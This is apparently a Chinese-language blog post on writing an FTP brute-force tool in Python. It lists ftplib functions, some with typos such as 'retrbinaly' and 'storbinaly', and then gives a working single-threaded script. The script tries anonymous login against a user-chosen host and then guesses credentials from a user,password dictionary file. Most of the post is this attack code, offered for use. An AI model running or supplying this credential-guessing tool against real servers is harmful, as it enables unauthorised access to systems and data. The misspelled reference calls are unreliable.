          <h1 class="post-title" itemprop="name headline">ftp爆破脚本编写</h1>
        

        <div class="post-meta">

    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>要写个ftp爆破的脚本，先学习下ftplib库吧。<br>官方文档:<a href="https://docs.python.org/3/library/ftplib.html" target="_blank" rel="noopener">https://docs.python.org/3/library/ftplib.html</a></p>
<p>部分函数释义<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import ftplib      # 加载ftp模块</span><br><span class="line">ftp = ftplib.FTP()                 # 获取FTP对象</span><br><span class="line">ftp.set_debuglevel(2)       # 打开调试级别2，显示详细信息</span><br><span class="line">ftp.connect(&apos;IP&apos;, PORT) # 连接ftp，server和端口</span><br><span class="line">ftp.login(&apos;user&apos;, &apos;password&apos;)  # 登录用户</span><br><span class="line">print(ftp.getwelcome())     # 打印欢迎信息</span><br><span class="line">ftp.cmd(&apos;xxx/xxx&apos;)          # 进入远程目录</span><br><span class="line">bufsize = 1024              # 设置缓存区大小</span><br><span class="line">filename=&apos;filename.txt&apos;     # 需要下载的文件</span><br><span class="line">file_handle=open(filename, &apos;wb&apos;).write   # 以写的模式在本地打开文件</span><br><span class="line">file.retrbinaly(&apos;RETR filename.txt&apos;, file_handle,bufsize)  # 接收服务器上文件并写入本地文件</span><br><span class="line">ftp.set_debuglevel(0)       # 关闭调试模式</span><br><span class="line">ftp.quit                    # 退出ftp</span><br></pre></td></tr></table></figure></p>
<p>ftp相关的命令操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ftp.cwd(pathname)           # 设置FTP当前操作的路径</span><br><span class="line">ftp.dir()                   # 显示目录下所有目录的信息</span><br><span class="line">ftp.nlst()                  # 获取目录下的文件</span><br><span class="line">ftp.mkd(pathname)           # 新建远程目录</span><br><span class="line">ftp.rmd(dirname)            # 删除远程目录</span><br><span class="line">ftp.pwd()                   # 返回当前所在位置</span><br><span class="line">ftp.delete(filename)        # 删除远程文件</span><br><span class="line">ftp.rename(fromname, toname)    #将fromname改为toname</span><br><span class="line">ftp.storbinaly(&apos;STOR filename.txt&apos;,file_handel,bufsize)  # 上传目标文件 </span><br><span class="line">ftp.retrbinary(&apos;RETR filename.txt&apos;,file_handel,bufsize)  # 下载FTP文件</span><br></pre></td></tr></table></figure></p>
<p>暂时写了个尚未完善的单线程爆破脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import ftplib</span><br><span class="line"></span><br><span class="line">def usage():</span><br><span class="line">    print(&apos;python  ftp爆破工具&apos;)</span><br><span class="line">def anonLogin(host):</span><br><span class="line">    try:</span><br><span class="line">        ftp=ftplib.FTP()</span><br><span class="line">        ftp.connect(host,port)</span><br><span class="line">        ftp.login()</span><br><span class="line">        ftp.retrlines(&apos;LIST&apos;)</span><br><span class="line">        print(ftp.getwelcome())</span><br><span class="line">        print(&apos;\n&apos;+host+&apos; FTP Anonymous Login Succeeded!&apos;)</span><br><span class="line">        ftp.quit()</span><br><span class="line">        return True</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&apos;\n&apos;+str(host)+&apos; FTP Anonymous Login Failed!&apos;)</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def bruteftp(host,file,port):</span><br><span class="line">    f=open(file,&apos;r&apos;)</span><br><span class="line">    lines=f.readlines()</span><br><span class="line">    for line in lines:</span><br><span class="line">        user=line.split(&quot;,&quot;)[0]</span><br><span class="line">        passwd=line.split(&quot;,&quot;)[1].strip(&quot;\n&quot;)</span><br><span class="line">        print(&apos;Trying: &apos;+user+&apos;:&apos;+passwd)</span><br><span class="line">        try:</span><br><span class="line">            ftp=ftplib.FTP()</span><br><span class="line">            ftp.connect(host,port)</span><br><span class="line">            ftp.login(user,passwd)</span><br><span class="line">            ftp.retrlines(&apos;LIST&apos;)</span><br><span class="line">            print(ftp.getwelcome())</span><br><span class="line">            print(&apos;\n&apos;+host +&apos;Succeeded!&apos;)</span><br><span class="line">            ftp.quit()</span><br><span class="line">            return(user,passwd)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            pass</span><br><span class="line">    print(&apos;\n Could not brute force FTP!&apos;)</span><br><span class="line">    return(None,None)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    usage()</span><br><span class="line">    host = input(&quot;请输入ftp地址:&quot;)</span><br><span class="line">    port = int(input(&quot;请输入端口号:&quot;))</span><br><span class="line">    if anonLogin(host):</span><br><span class="line">        pass</span><br><span class="line">    else:</span><br><span class="line">        a=bruteftp(host,&quot;dict.txt&quot;,port)</span><br><span class="line">        print(&quot;User：%s Password：%s&quot;%a)</span><br></pre></td></tr></table></figure>
